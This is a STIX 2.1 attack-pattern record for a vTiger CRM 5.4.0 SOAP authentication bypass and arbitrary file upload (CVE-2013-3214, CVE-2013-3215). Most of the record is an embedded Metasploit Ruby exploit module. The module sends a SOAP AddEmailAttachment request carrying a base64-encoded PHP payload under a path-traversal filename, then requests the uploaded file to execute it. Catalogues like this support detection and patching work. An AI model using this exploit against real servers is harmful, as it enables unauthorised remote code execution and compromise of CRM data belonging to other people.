{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b0731e16-49ca-4183-8e54-639bf0871010",
    "created": "2024-08-14T17:09:32.021633Z",
    "modified": "2024-08-14T17:09:32.021637Z",
    "name": "vTiger CRM SOAP AddEmailAttachment Arbitrary File Upload",
    "description": " vTiger CRM allows a user to bypass authentication when requesting SOAP services. In addition, arbitrary file upload is possible through the AddEmailAttachment SOAP service. By combining both vulnerabilities an attacker can upload and execute PHP code. This module has been tested successfully on vTiger CRM v5.4.0 over Ubuntu 10.04 and Windows 2003 SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/vtiger_soap_upload.rb",
            "external_id": "vtiger_soap_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3214"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3215"
        },
        {
            "source_name": "reference",
            "url": "http://karmainsecurity.com/KIS-2013-07"
        },
        {
            "source_name": "reference",
            "url": "http://karmainsecurity.com/KIS-2013-08"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include REXML\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'vTiger CRM SOAP AddEmailAttachment Arbitrary File Upload',\n      'Description'    => %q{\n          vTiger CRM allows a user to bypass authentication when requesting SOAP services.\n          In addition, arbitrary file upload is possible through the AddEmailAttachment SOAP\n          service. By combining both vulnerabilities an attacker can upload and execute PHP\n          code. This module has been tested successfully on vTiger CRM v5.4.0 over Ubuntu\n          10.04 and Windows 2003 SP2.\n        },\n      'Author'         =>\n        [\n          'Egidio Romano', # Vulnerability discovery\n          'juan vazquez' # msf module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2013-3214' ],\n          [ 'CVE', '2013-3215' ],\n          [ 'OSVDB', '95902' ],\n          [ 'OSVDB', '95903' ],\n          [ 'BID', '61558' ],\n          [ 'BID', '61559' ],\n          [ 'EDB', '27279' ],\n          [ 'URL', 'http://karmainsecurity.com/KIS-2013-07' ],\n          [ 'URL', 'http://karmainsecurity.com/KIS-2013-08' ]\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Payload'        =>\n        {\n          # Arbitrary big number. The payload is sent base64 encoded\n          # into a POST SOAP request\n          'Space'       => 262144, # 256k\n          'DisableNops' => true\n        },\n      'Targets' =>\n        [\n          [ 'vTigerCRM v5.4.0', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-03-26'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"Base vTiger CRM directory path\", '/vtigercrm/'])\n      ])\n  end\n\n  def check\n    test_one = check_email_soap(\"admin\", rand_text_alpha(4 + rand(4)))\n    res = send_soap_request(test_one)\n\n    unless res and res.code == 200 and res.body.to_s =~ /<return xsi:nil=\"true\" xsi:type=\"xsd:string\"\\/>/\n      return Exploit::CheckCode::Unknown\n    end\n\n    test_two = check_email_soap(\"admin\")\n    res = send_soap_request(test_two)\n\n    if res and res.code == 200 and (res.body.blank? or res.body.to_s =~ /<return xsi:type=\"xsd:string\">.*<\\/return>/)\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    file_name = rand_text_alpha(rand(10)+6) + '.php'\n    php = %Q|<?php #{payload.encoded} ?>|\n\n    soap = add_attachment_soap(file_name, php)\n    res = send_soap_request(soap)\n\n    print_status(\"Uploading payload...\")\n    if res and res.code == 200 and res.body.to_s =~ /<return xsi:type=\"xsd:string\">.*<\\/return>/\n      print_good(\"Upload successfully uploaded\")\n      register_files_for_cleanup(file_name)\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Upload failed\")\n    end\n\n    print_status(\"Executing payload...\")\n    send_request_cgi({'uri' => normalize_uri(target_uri.path, file_name)}, 0)\n  end\n\n  def add_attachment_soap(file_name, file_data)\n    xml = Document.new\n    xml.add_element(\n      \"soapenv:Envelope\",\n      {\n        'xmlns:xsi'     => \"http://www.w3.org/2001/XMLSchema-instance\",\n        'xmlns:xsd'     => \"http://www.w3.org/2001/XMLSchema\",\n        'xmlns:soapenv' => \"http://schemas.xmlsoap.org/soap/envelope/\",\n        'xmlns:crm'     => \"http://www.vtiger.com/products/crm\"\n      })\n    xml.root.add_element(\"soapenv:Header\")\n    xml.root.add_element(\"soapenv:Body\")\n    body = xml.root.elements[2]\n    body.add_element(\n      \"crm:AddEmailAttachment\",\n      {\n        'soapenv:encodingStyle' => \"http://schemas.xmlsoap.org/soap/encoding/\"\n      })\n    crm = body.elements[1]\n    crm.add_element(\"emailid\", {'xsi:type' => 'xsd:string'})\n    crm.add_element(\"filedata\", {'xsi:type' => 'xsd:string'})\n    crm.add_element(\"filename\", {'xsi:type' => 'xsd:string'})\n    crm.add_element(\"filesize\", {'xsi:type' => 'xsd:string'})\n    crm.add_element(\"filetype\", {'xsi:type' => 'xsd:string'})\n    crm.add_element(\"username\", {'xsi:type' => 'xsd:string'})\n    crm.add_element(\"session\", {'xsi:type' => 'xsd:string'})\n    crm.elements['emailid'].text = rand_text_alpha(4+rand(4))\n    crm.elements['filedata'].text = \"MSF_PAYLOAD\"\n    crm.elements['filename'].text = \"MSF_FILENAME\"\n    crm.elements['filesize'].text = file_data.length.to_s\n    crm.elements['filetype'].text = \"php\"\n    crm.elements['username'].text = rand_text_alpha(4+rand(4))\n\n    xml_string = xml.to_s\n    xml_string.gsub!(/MSF_PAYLOAD/, Rex::Text.encode_base64(file_data))\n    xml_string.gsub!(/MSF_FILENAME/, \"../../../../../../#{file_name}\")\n\n    return xml_string\n  end\n\n  def check_email_soap(user_name = \"\", session = \"\")\n    xml = Document.new\n    xml.add_element(\n      \"soapenv:Envelope\",\n      {\n        'xmlns:xsi'     => \"http://www.w3.org/2001/XMLSchema-instance\",\n        'xmlns:xsd'     => \"http://www.w3.org/2001/XMLSchema\",\n        'xmlns:soapenv' => \"http://schemas.xmlsoap.org/soap/envelope/\",\n        'xmlns:crm'     => \"http://www.vtiger.com/products/crm\"\n      })\n    xml.root.add_element(\"soapenv:Header\")\n    xml.root.add_element(\"soapenv:Body\")\n    body = xml.root.elements[2]\n    body.add_element(\n      \"crm:CheckEmailPermission\",\n      {\n        'soapenv:encodingStyle' => \"http://schemas.xmlsoap.org/soap/encoding/\"\n      })\n    crm = body.elements[1]\n    crm.add_element(\"username\", {'xsi:type' => 'xsd:string'})\n    crm.add_element(\"session\", {'xsi:type' => 'xsd:string'})\n    crm.elements['username'].text = user_name\n    crm.elements['session'].text = session\n\n    xml.to_s\n  end\n\n  def send_soap_request(soap_data)\n    res = send_request_cgi({\n      'uri'      => normalize_uri(target_uri.path, 'vtigerservice.php'),\n      'method'   => 'POST',\n      'vars_get' => { 'service' => 'outlook' },\n      'ctype'    => 'text/xml; charset=UTF-8',\n      'data'     => soap_data\n    })\n\n    return res\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-03-26",
    "x_mitre_platforms": [
        "['php']"
    ]
}